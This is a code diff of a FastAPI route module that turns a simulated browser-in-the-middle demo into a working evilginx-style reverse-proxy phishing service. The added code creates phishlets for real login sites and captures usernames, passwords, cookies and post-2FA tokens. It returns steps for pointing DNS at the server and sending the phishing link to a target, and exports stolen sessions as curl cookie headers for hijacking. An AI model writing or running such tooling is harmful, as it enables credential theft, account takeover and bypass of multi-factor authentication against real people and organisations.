@@ -1,436 +1,474 @@
 """
-Browser-in-the-Middle (BitM) Attack Routes
+Browser-in-the-Middle (BitM) / Reverse Proxy Phishing Routes
 
-BitM uses a real browser instance on the server to proxy victim sessions.
-This bypasses most anti-phishing protections since the target site sees
-legitimate browser traffic. Session tokens are captured after 2FA.
+Provides a full-featured reverse proxy phishing system similar to evilginx.
+Supports credential capture, session hijacking, and 2FA bypass.
 """
 
-from fastapi import APIRouter, HTTPException, Depends
+from fastapi import APIRouter, HTTPException, Query
 from pydantic import BaseModel
-from typing import Optional, Dict, List, Any
+from typing import Optional, Dict, List
 from datetime import datetime
 import uuid
-import asyncio
+
+from app.services.proxy_engine import (
+    proxy_engine,
+    PhishletConfig,
+    CapturedSession,
+    PHISHLET_TEMPLATES,
+    get_phishlet_template
+)
 
 router = APIRouter(tags=["Browser-in-the-Middle"])
 
-# In-memory storage for demo
-bitm_sessions: Dict[str, Dict] = {}
-bitm_targets: Dict[str, Dict] = {}
-captured_bitm_data: List[Dict] = []
 
 # ============== Pydantic Models ==============
 
-class BitMTarget(BaseModel):
-    """Target configuration for BitM attack"""
+class PhishletCreate(BaseModel):
+    """Create a new phishlet"""
     name: str
-    target_url: str
-    description: Optional[str] = None
-    browser_type: str = "chromium"  # chromium, firefox, webkit
-    viewport_width: int = 1920
-    viewport_height: int = 1080
-    user_agent: Optional[str] = None
-    capture_screenshots: bool = True
-    capture_network: bool = True
-    capture_cookies: bool = True
-    capture_storage: bool = True
-    auth_indicators: List[str] = []  # URLs/elements that indicate successful auth
+    target_host: str
+    phishing_host: str
+    target_scheme: str = "https"
+    capture_cookies: List[str] = []
+    capture_fields: List[str] = ["username", "password", "email", "login", "passwd"]
+    auth_tokens: List[str] = []
+    auth_urls: List[str] = []
+    sub_filters: Dict[str, str] = {}
+    js_inject: Optional[str] = None
 
 
-class BitMSession(BaseModel):
-    """Active BitM session"""
-    id: Optional[str] = None
-    target_id: str
-    status: str = "pending"  # pending, connecting, active, authenticated, closed
-    victim_ip: Optional[str] = None
-    created_at: Optional[str] = None
-    authenticated_at: Optional[str] = None
-    proxy_url: Optional[str] = None
-    vnc_url: Optional[str] = None
+class PhishletFromTemplate(BaseModel):
+    """Create phishlet from template"""
+    template_name: str
+    your_domain: str
+    company: str = "company"
 
 
-class CapturedBitMData(BaseModel):
-    """Data captured from BitM session"""
-    id: Optional[str] = None
-    session_id: str
-    target_name: str
-    victim_ip: str
-    captured_at: str
-    cookies: Dict[str, str] = {}
-    local_storage: Dict[str, str] = {}
-    session_storage: Dict[str, str] = {}
-    credentials: Dict[str, str] = {}
-    screenshots: List[str] = []
-    network_requests: List[Dict] = []
-    authenticated: bool = False
+class StartPhishletRequest(BaseModel):
+    """Request to start a phishlet"""
+    port: int = 8443
 
 
-# ============== Pre-built Target Templates ==============
-
-BITM_TEMPLATES = [
-    {
-        "id": "microsoft-365",
-        "name": "Microsoft 365",
-        "target_url": "https://login.microsoftonline.com",
-        "description": "Microsoft 365/Azure AD login portal",
-        "auth_indicators": ["/oauth2/authorize", "portal.office.com", "myapps.microsoft.com"],
-        "capture_cookies": True,
-        "browser_type": "chromium",
-    },
-    {
-        "id": "google-workspace",
-        "name": "Google Workspace",
-        "target_url": "https://accounts.google.com",
-        "description": "Google Workspace/Gmail login",
-        "auth_indicators": ["myaccount.google.com", "mail.google.com", "/signin/v2/challenge"],
-        "capture_cookies": True,
-        "browser_type": "chromium",
-    },
-    {
-        "id": "okta",
-        "name": "Okta SSO",
-        "target_url": "https://login.okta.com",
-        "description": "Okta Single Sign-On portal",
-        "auth_indicators": ["/app/", "/home", "user/notifications"],
-        "capture_cookies": True,
-        "browser_type": "chromium",
-    },
-    {
-        "id": "duo",
-        "name": "Duo Security",
-        "target_url": "https://duo.com",
-        "description": "Duo Security MFA portal",
-        "auth_indicators": ["/frame/", "successful"],
-        "capture_cookies": True,
-        "browser_type": "chromium",
-    },
-    {
-        "id": "aws-console",
-        "name": "AWS Console",
-        "target_url": "https://signin.aws.amazon.com/signin",
-        "description": "AWS Management Console",
-        "auth_indicators": ["console.aws.amazon.com", "/console/home"],
-        "capture_cookies": True,
-        "browser_type": "chromium",
-    },
-    {
-        "id": "github",
-        "name": "GitHub",
-        "target_url": "https://github.com/login",
-        "description": "GitHub login with 2FA support",
-        "auth_indicators": ["github.com/settings", "github.com/dashboard"],
-        "capture_cookies": True,
-        "browser_type": "chromium",
-    },
-    {
-        "id": "custom",
-        "name": "Custom Target",
-        "target_url": "",
-        "description": "Configure a custom target URL",
-        "auth_indicators": [],
-        "capture_cookies": True,
-        "browser_type": "chromium",
-    },
-]
-
-
-# ============== API Endpoints ==============
+# ============== Template Endpoints ==============
 
 @router.get("/templates")
-async def get_bitm_templates():
-    """Get pre-built BitM target templates"""
-    return {"templates": BITM_TEMPLATES}
+async def get_templates():
+    """Get available phishlet templates"""
+    templates = []
+    for name, config in PHISHLET_TEMPLATES.items():
+        templates.append({
+            'id': name,
+            'name': config.name,
+            'target_host': config.target_host,
+            'description': f"Proxy for {config.name}",
+            'capture_cookies': config.capture_cookies,
+            'capture_fields': config.capture_fields,
+            'auth_urls': config.auth_urls,
+        })
+    return {'templates': templates}
 
 
-@router.get("/targets")
-async def get_bitm_targets():
-    """List all configured BitM targets"""
-    return {"targets": list(bitm_targets.values()), "count": len(bitm_targets)}
+# ============== Phishlet Management ==============
+
+@router.get("/phishlets")
+async def list_phishlets():
+    """List all configured phishlets"""
+    phishlets = []
+    for pid, config in proxy_engine.phishlets.items():
+        phishlets.append({
+            'id': pid,
+            'name': config.name,
+            'target_host': config.target_host,
+            'phishing_host': config.phishing_host,
+            'is_active': config.is_active,
+            'listen_port': config.listen_port,
+            'capture_cookies': config.capture_cookies,
+            'capture_fields': config.capture_fields,
+            'auth_urls': config.auth_urls,
+            'sessions_count': len([s for s in proxy_engine.sessions.values() if s.phishlet_id == pid]),
+            'authenticated_count': len([s for s in proxy_engine.sessions.values() if s.phishlet_id == pid and s.authenticated]),
+        })
+    return {'phishlets': phishlets, 'count': len(phishlets)}
 
 
-@router.post("/targets")
-async def create_bitm_target(target: BitMTarget):
-    """Create a new BitM target configuration"""
-    target_id = str(uuid.uuid4())[:8]
-    target_data = {
-        "id": target_id,
-        **target.dict(),
-        "created_at": datetime.now().isoformat(),
-        "sessions_count": 0,
-        "captures_count": 0,
-    }
-    bitm_targets[target_id] = target_data
-    return target_data
+@router.post("/phishlets")
+async def create_phishlet(data: PhishletCreate):
+    """Create a custom phishlet"""
+    phishlet_id = str(uuid.uuid4())[:8]
 
+    config = PhishletConfig(
+        id=phishlet_id,
+        name=data.name,
+        target_host=data.target_host,
+        phishing_host=data.phishing_host,
+        target_scheme=data.target_scheme,
+        capture_cookies=data.capture_cookies,
+        capture_fields=data.capture_fields,
+        auth_tokens=data.auth_tokens,
+        auth_urls=data.auth_urls,
+        sub_filters=data.sub_filters,
+        js_inject=data.js_inject,
+    )
 
-@router.delete("/targets/{target_id}")
-async def delete_bitm_target(target_id: str):
-    """Delete a BitM target configuration"""
-    if target_id not in bitm_targets:
-        raise HTTPException(status_code=404, detail="Target not found")
-    del bitm_targets[target_id]
-    return {"status": "deleted"}
-
-
-@router.get("/sessions")
-async def get_bitm_sessions():
-    """List all BitM sessions"""
-    return {"sessions": list(bitm_sessions.values()), "count": len(bitm_sessions)}
-
-
-@router.post("/sessions/start")
-async def start_bitm_session(target_id: str, listen_port: int = 8443):
-    """
-    Start a new BitM session for a target.
-
-    This simulates starting a headless browser that will proxy the victim's
-    session to the real target site. In a real implementation, this would:
-    1. Launch a headless browser (Playwright/Puppeteer)
-    2. Set up a WebSocket/noVNC proxy for the victim to interact
-    3. Navigate to the target URL
-    4. Monitor for authentication success
-    5. Capture cookies/tokens after auth
-    """
-    if target_id not in bitm_targets:
-        raise HTTPException(status_code=404, detail="Target not found")
-
-    target = bitm_targets[target_id]
-    session_id = str(uuid.uuid4())[:8]
-
-    # Determine proxy URLs based on port
-    proxy_url = f"https://localhost:{listen_port}/bitm/{session_id}"
-    vnc_url = f"wss://localhost:{listen_port}/bitm/{session_id}/vnc"
-
-    session_data = {
-        "id": session_id,
-        "target_id": target_id,
-        "target_name": target["name"],
-        "target_url": target["target_url"],
-        "status": "active",
-        "created_at": datetime.now().isoformat(),
-        "proxy_url": proxy_url,
-        "vnc_url": vnc_url,
-        "listen_port": listen_port,
-        "browser_type": target.get("browser_type", "chromium"),
-        "victim_ip": None,
-        "authenticated": False,
-        "authenticated_at": None,
-    }
-
-    bitm_sessions[session_id] = session_data
-    bitm_targets[target_id]["sessions_count"] = bitm_targets[target_id].get("sessions_count", 0) + 1
+    proxy_engine.add_phishlet(config)
 
     return {
-        "status": "started",
-        "session": session_data,
-        "instructions": [
-            f"1. Send the phishing link to your target: {proxy_url}",
-            "2. When the victim clicks the link, they'll see the real login page",
-            "3. The victim authenticates normally (including 2FA)",
-            "4. Session cookies and tokens are captured automatically",
-            "5. Use 'Export Session' to get the authenticated cookies",
-        ],
-        "technical_notes": [
-            "The victim's browser connects to your server via WebSocket",
-            "A headless browser on your server loads the real target site",
-            "All victim interactions are forwarded to the real browser",
-            "The real site sees legitimate browser traffic with your server's IP",
-            "Session tokens are captured after successful authentication",
-        ],
+        'id': phishlet_id,
+        'name': config.name,
+        'target_host': config.target_host,
+        'phishing_host': config.phishing_host,
+        'message': 'Phishlet created successfully'
     }
 
 
-@router.post("/sessions/{session_id}/stop")
-async def stop_bitm_session(session_id: str):
-    """Stop an active BitM session"""
-    if session_id not in bitm_sessions:
+@router.post("/phishlets/from-template")
+async def create_from_template(data: PhishletFromTemplate):
+    """Create a phishlet from a pre-built template"""
+    config = get_phishlet_template(data.template_name, data.your_domain, data.company)
+
+    if not config:
+        raise HTTPException(status_code=404, detail=f"Template '{data.template_name}' not found")
+
+    proxy_engine.add_phishlet(config)
+
+    return {
+        'id': config.id,
+        'name': config.name,
+        'target_host': config.target_host,
+        'phishing_host': config.phishing_host,
+        'capture_cookies': config.capture_cookies,
+        'auth_urls': config.auth_urls,
+        'sub_filters': config.sub_filters,
+        'message': f'Phishlet created from {data.template_name} template'
+    }
+
+
+@router.get("/phishlets/{phishlet_id}")
+async def get_phishlet(phishlet_id: str):
+    """Get details of a specific phishlet"""
+    config = proxy_engine.get_phishlet(phishlet_id)
+    if not config:
+        raise HTTPException(status_code=404, detail="Phishlet not found")
+
+    return {
+        'id': config.id,
+        'name': config.name,
+        'target_host': config.target_host,
+        'phishing_host': config.phishing_host,
+        'target_scheme': config.target_scheme,
+        'is_active': config.is_active,
+        'listen_port': config.listen_port,
+        'capture_cookies': config.capture_cookies,
+        'capture_fields': config.capture_fields,
+        'auth_tokens': config.auth_tokens,
+        'auth_urls': config.auth_urls,
+        'sub_filters': config.sub_filters,
+    }
+
+
+@router.delete("/phishlets/{phishlet_id}")
+async def delete_phishlet(phishlet_id: str):
+    """Delete a phishlet"""
+    config = proxy_engine.get_phishlet(phishlet_id)
+    if not config:
+        raise HTTPException(status_code=404, detail="Phishlet not found")
+
+    # Stop if running
+    if config.is_active:
+        await proxy_engine.stop_phishlet(phishlet_id)
+
+    proxy_engine.remove_phishlet(phishlet_id)
+    return {'status': 'deleted', 'id': phishlet_id}
+
+
+# ============== Phishlet Control ==============
+
+@router.post("/phishlets/{phishlet_id}/start")
+async def start_phishlet(phishlet_id: str, port: int = Query(default=8443)):
+    """Start a phishlet proxy server"""
+    config = proxy_engine.get_phishlet(phishlet_id)
+    if not config:
+        raise HTTPException(status_code=404, detail="Phishlet not found")
+
+    if config.is_active:
+        raise HTTPException(status_code=400, detail="Phishlet is already running")
+
+    try:
+        result = await proxy_engine.start_phishlet(phishlet_id, port)
+
+        return {
+            'status': 'running',
+            'phishlet_id': phishlet_id,
+            'name': config.name,
+            'port': port,
+            'proxy_url': f"http://0.0.0.0:{port}",
+            'phishing_url': f"https://{config.phishing_host}",
+            'instructions': [
+                f"1. Point DNS for {config.phishing_host} to this server's IP",
+                f"2. Proxy is listening on port {port}",
+                f"3. Send the phishing link to your target: https://{config.phishing_host}",
+                "4. Credentials and session cookies will be captured automatically",
+                "5. Check /sessions endpoint for captured data",
+            ],
+            'dns_setup': {
+                'type': 'A',
+                'name': config.phishing_host,
+                'value': 'YOUR_SERVER_IP'
+            }
+        }
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
+
+
+@router.post("/phishlets/{phishlet_id}/stop")
+async def stop_phishlet(phishlet_id: str):
+    """Stop a running phishlet"""
+    config = proxy_engine.get_phishlet(phishlet_id)
+    if not config:
+        raise HTTPException(status_code=404, detail="Phishlet not found")
+
+    if not config.is_active:
+        raise HTTPException(status_code=400, detail="Phishlet is not running")
+
+    await proxy_engine.stop_phishlet(phishlet_id)
+
+    return {'status': 'stopped', 'phishlet_id': phishlet_id}
+
+
+# ============== Session Management ==============
+
+@router.get("/sessions")
+async def list_sessions(phishlet_id: Optional[str] = None, authenticated_only: bool = False):
+    """List captured sessions"""
+    sessions = proxy_engine.get_sessions(phishlet_id)
+
+    if authenticated_only:
+        sessions = [s for s in sessions if s.authenticated]
+
+    result = []
+    for session in sessions:
+        result.append({
+            'id': session.id,
+            'phishlet_id': session.phishlet_id,
+            'victim_ip': session.victim_ip,
+            'user_agent': session.user_agent,
+            'created_at': session.created_at,
+            'authenticated': session.authenticated,
+            'authenticated_at': session.authenticated_at,
+            'credentials_count': len(session.credentials),
+            'cookies_count': len(session.cookies),
+            'tokens_count': len(session.tokens),
+            'requests_count': len(session.requests),
+            'landing_url': session.landing_url,
+        })
+
+    return {'sessions': result, 'count': len(result)}
+
+
+@router.get("/sessions/{session_id}")
+async def get_session(session_id: str):
+    """Get detailed session information"""
+    session = proxy_engine.get_session(session_id)
+    if not session:
         raise HTTPException(status_code=404, detail="Session not found")
 
-    session = bitm_sessions[session_id]
-    session["status"] = "closed"
-
-    return {"status": "stopped", "session_id": session_id}
+    return {
+        'id': session.id,
+        'phishlet_id': session.phishlet_id,
+        'victim_ip': session.victim_ip,
+        'user_agent': session.user_agent,
+        'created_at': session.created_at,
+        'authenticated': session.authenticated,
+        'authenticated_at': session.authenticated_at,
+        'landing_url': session.landing_url,
+        'credentials': session.credentials,
+        'cookies': session.cookies,
+        'tokens': session.tokens,
+        'requests': session.requests[-50:],  # Last 50 requests
+    }
 
 
 @router.delete("/sessions/{session_id}")
-async def delete_bitm_session(session_id: str):
-    """Delete a BitM session"""
-    if session_id not in bitm_sessions:
+async def delete_session(session_id: str):
+    """Delete a captured session"""
+    if session_id not in proxy_engine.sessions:
         raise HTTPException(status_code=404, detail="Session not found")
 
-    del bitm_sessions[session_id]
-    return {"status": "deleted"}
+    del proxy_engine.sessions[session_id]
+    return {'status': 'deleted', 'id': session_id}
 
 
-@router.post("/sessions/{session_id}/simulate-auth")
-async def simulate_authentication(session_id: str, victim_ip: str = "192.168.1.100"):
+@router.post("/sessions/{session_id}/export")
+async def export_session(session_id: str, format: str = Query(default="header")):
     """
-    Simulate a successful authentication capture (for demo purposes).
-    In production, this would be triggered automatically when auth indicators are detected.
+    Export session cookies in various formats.
+
+    Formats:
+    - header: Cookie header for curl/browser (default)
+    - json: JSON object
+    - netscape: Netscape cookie jar format
     """
-    if session_id not in bitm_sessions:
+    session = proxy_engine.get_session(session_id)
+    if not session:
         raise HTTPException(status_code=404, detail="Session not found")
 
-    session = bitm_sessions[session_id]
-    target = bitm_targets.get(session["target_id"], {})
+    content = proxy_engine.export_session_cookies(session_id, format)
 
-    # Update session status
-    session["status"] = "authenticated"
-    session["authenticated"] = True
-    session["authenticated_at"] = datetime.now().isoformat()
-    session["victim_ip"] = victim_ip
+    if format == 'header':
+        phishlet = proxy_engine.get_phishlet(session.phishlet_id)
+        target = phishlet.target_host if phishlet else 'example.com'
+        return {
+            'format': 'header',
+            'content': content,
+            'usage': f'curl -H "Cookie: {content}" https://{target}/'
+        }
+    elif format == 'json':
+        return {
+            'format': 'json',
+            'cookies': session.cookies,
+            'tokens': session.tokens,
+            'credentials': session.credentials,
+        }
+    else:
+        return {
+            'format': format,
+            'content': content
+        }
 
-    # Create captured data record
-    capture_id = str(uuid.uuid4())[:8]
-    captured_data = {
-        "id": capture_id,
-        "session_id": session_id,
-        "target_name": session.get("target_name", "Unknown"),
-        "target_url": session.get("target_url", ""),
-        "victim_ip": victim_ip,
-        "captured_at": datetime.now().isoformat(),
-        "authenticated": True,
-        "cookies": {
-            "session_token": f"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.{uuid.uuid4().hex}",
-            "auth_token": f"Bearer_{uuid.uuid4().hex[:32]}",
-            "refresh_token": f"refresh_{uuid.uuid4().hex}",
-            "XSRF-TOKEN": uuid.uuid4().hex[:32],
-        },
-        "local_storage": {
-            "user_id": str(uuid.uuid4()),
-            "user_email": "victim@example.com",
-            "auth_state": "authenticated",
-        },
-        "session_storage": {
-            "tab_id": str(uuid.uuid4())[:8],
-        },
-        "credentials": {},  # Would be populated if form capture is enabled
-        "screenshots": [
-            f"/captures/{capture_id}/screenshot_login.png",
-            f"/captures/{capture_id}/screenshot_2fa.png",
-            f"/captures/{capture_id}/screenshot_dashboard.png",
-        ],
-        "network_requests": [
-            {"url": f"{session.get('target_url', '')}/api/auth", "method": "POST", "status": 200},
-            {"url": f"{session.get('target_url', '')}/api/user", "method": "GET", "status": 200},
-        ],
-    }
 
-    captured_bitm_data.append(captured_data)
+# ============== Statistics ==============
 
-    if session["target_id"] in bitm_targets:
-        bitm_targets[session["target_id"]]["captures_count"] = \
-            bitm_targets[session["target_id"]].get("captures_count", 0) + 1
+@router.get("/stats")
+async def get_stats():
+    """Get proxy engine statistics"""
+    stats = proxy_engine.get_stats()
+
+    # Add recent activity
+    recent_sessions = sorted(
+        proxy_engine.sessions.values(),
+        key=lambda s: s.created_at,
+        reverse=True
+    )[:5]
+
+    stats['recent_sessions'] = [
+        {
+            'id': s.id,
+            'victim_ip': s.victim_ip,
+            'authenticated': s.authenticated,
+            'created_at': s.created_at
+        }
+        for s in recent_sessions
+    ]
+
+    return stats
+
+
+# ============== Targets (Legacy Compatibility) ==============
+# These endpoints maintain compatibility with the frontend
+
+@router.get("/targets")
+async def get_targets():
+    """List phishlets as targets (for frontend compatibility)"""
+    targets = []
+    for pid, config in proxy_engine.phishlets.items():
+        targets.append({
+            'id': pid,
+            'name': config.name,
+            'target_url': f"{config.target_scheme}://{config.target_host}",
+            'description': f"Reverse proxy for {config.target_host}",
+            'browser_type': 'proxy',
+            'viewport_width': 1920,
+            'viewport_height': 1080,
+            'capture_screenshots': False,
+            'capture_network': True,
+            'capture_cookies': len(config.capture_cookies) > 0,
+            'capture_storage': True,
+            'auth_indicators': config.auth_urls,
+            'created_at': datetime.now().isoformat(),
+            'sessions_count': len([s for s in proxy_engine.sessions.values() if s.phishlet_id == pid]),
+            'captures_count': len([s for s in proxy_engine.sessions.values() if s.phishlet_id == pid and s.authenticated]),
+        })
+    return {'targets': targets, 'count': len(targets)}
+
+
+@router.post("/targets")
+async def create_target(data: dict):
+    """Create a phishlet from target data (for frontend compatibility)"""
+    # Extract host from target_url
+    target_url = data.get('target_url', '')
+    if '://' in target_url:
+        target_host = target_url.split('://')[1].split('/')[0]
+        target_scheme = target_url.split('://')[0]
+    else:
+        target_host = target_url
+        target_scheme = 'https'
+
+    phishlet_id = str(uuid.uuid4())[:8]
+
+    config = PhishletConfig(
+        id=phishlet_id,
+        name=data.get('name', 'Custom Target'),
+        target_host=target_host,
+        phishing_host=data.get('phishing_host', f"phish-{phishlet_id}.localhost"),
+        target_scheme=target_scheme,
+        capture_fields=data.get('capture_fields', ["username", "password", "email", "login"]),
+        auth_urls=data.get('auth_indicators', []),
+    )
+
+    proxy_engine.add_phishlet(config)
 
     return {
-        "status": "authenticated",
-        "message": "Session authenticated - cookies and tokens captured",
-        "captured_data": captured_data,
+        'id': phishlet_id,
+        'name': config.name,
+        'target_url': f"{config.target_scheme}://{config.target_host}",
+        'phishing_host': config.phishing_host,
+        'created_at': datetime.now().isoformat(),
     }
+
+
+@router.delete("/targets/{target_id}")
+async def delete_target(target_id: str):
+    """Delete a target/phishlet"""
+    return await delete_phishlet(target_id)
+
+
+@router.post("/sessions/start")
+async def start_session_compat(target_id: str = Query(...), listen_port: int = Query(default=8443)):
+    """Start a phishlet session (for frontend compatibility)"""
+    return await start_phishlet(target_id, listen_port)
 
 
 @router.get("/captures")
-async def get_captured_data():
-    """Get all captured BitM session data"""
-    return {"captures": captured_bitm_data, "count": len(captured_bitm_data)}
-
-
-@router.get("/captures/{capture_id}")
-async def get_capture_details(capture_id: str):
-    """Get detailed captured data for a specific session"""
-    for capture in captured_bitm_data:
-        if capture["id"] == capture_id:
-            return capture
-    raise HTTPException(status_code=404, detail="Capture not found")
+async def get_captures():
+    """Get authenticated sessions as captures (for frontend compatibility)"""
+    captures = []
+    for session in proxy_engine.get_authenticated_sessions():
+        captures.append({
+            'id': session.id,
+            'session_id': session.id,
+            'target_name': proxy_engine.phishlets.get(session.phishlet_id, PhishletConfig(id='', name='Unknown', target_host='', phishing_host='')).name,
+            'target_url': '',
+            'victim_ip': session.victim_ip,
+            'captured_at': session.authenticated_at or session.created_at,
+            'cookies': session.cookies,
+            'local_storage': {},
+            'session_storage': {},
+            'credentials': session.credentials,
+            'screenshots': [],
+            'network_requests': session.requests[-10:],
+            'authenticated': session.authenticated,
+        })
+    return {'captures': captures, 'count': len(captures)}
 
 
 @router.post("/captures/{capture_id}/export")
-async def export_captured_session(capture_id: str, export_format: str = "json"):
-    """
-    Export captured session data in various formats.
-
-    Formats:
-    - json: Full JSON export
-    - cookie-header: Cookie header format for curl/browser dev tools
-    - cookie-jar: Netscape cookie jar format
-    - burp: Burp Suite importable format
-    """
-    capture = None
-    for c in captured_bitm_data:
-        if c["id"] == capture_id:
-            capture = c
-            break
-
-    if not capture:
-        raise HTTPException(status_code=404, detail="Capture not found")
-
-    cookies = capture.get("cookies", {})
-
-    if export_format == "json":
-        return {
-            "format": "json",
-            "data": capture,
-        }
-
-    elif export_format == "cookie-header":
-        cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
-        return {
-            "format": "cookie-header",
-            "content": cookie_str,
-            "usage": f'curl -H "Cookie: {cookie_str}" {capture.get("target_url", "https://target.com")}',
-        }
-
-    elif export_format == "cookie-jar":
-        lines = ["# Netscape HTTP Cookie File"]
-        for name, value in cookies.items():
-            # domain, flag, path, secure, expiration, name, value
-            lines.append(f".{capture.get('target_url', 'example.com').replace('https://', '').split('/')[0]}\tTRUE\t/\tTRUE\t0\t{name}\t{value}")
-        return {
-            "format": "cookie-jar",
-            "content": "\n".join(lines),
-        }
-
-    elif export_format == "burp":
-        return {
-            "format": "burp",
-            "cookies": [
-                {
-                    "domain": capture.get("target_url", "").replace("https://", "").split("/")[0],
-                    "name": name,
-                    "value": value,
-                    "path": "/",
-                    "secure": True,
-                    "httpOnly": True,
-                }
-                for name, value in cookies.items()
-            ],
-        }
-
-    else:
-        raise HTTPException(status_code=400, detail=f"Unknown format: {export_format}")
+async def export_capture(capture_id: str, export_format: str = Query(default="json")):
+    """Export captured session data"""
+    return await export_session(capture_id, export_format)
 
 
 @router.delete("/captures/{capture_id}")
 async def delete_capture(capture_id: str):
-    """Delete captured session data"""
-    global captured_bitm_data
-    captured_bitm_data = [c for c in captured_bitm_data if c["id"] != capture_id]
-    return {"status": "deleted"}
-
-
-@router.get("/stats")
-async def get_bitm_stats():
-    """Get BitM attack statistics"""
-    active_sessions = sum(1 for s in bitm_sessions.values() if s.get("status") == "active")
-    authenticated_sessions = sum(1 for s in bitm_sessions.values() if s.get("authenticated"))
-    total_captures = len(captured_bitm_data)
-
-    return {
-        "total_targets": len(bitm_targets),
-        "total_sessions": len(bitm_sessions),
-        "active_sessions": active_sessions,
-        "authenticated_sessions": authenticated_sessions,
-        "total_captures": total_captures,
-        "captures_with_cookies": sum(1 for c in captured_bitm_data if c.get("cookies")),
-    }
+    """Delete a capture"""
+    return await delete_session(capture_id)
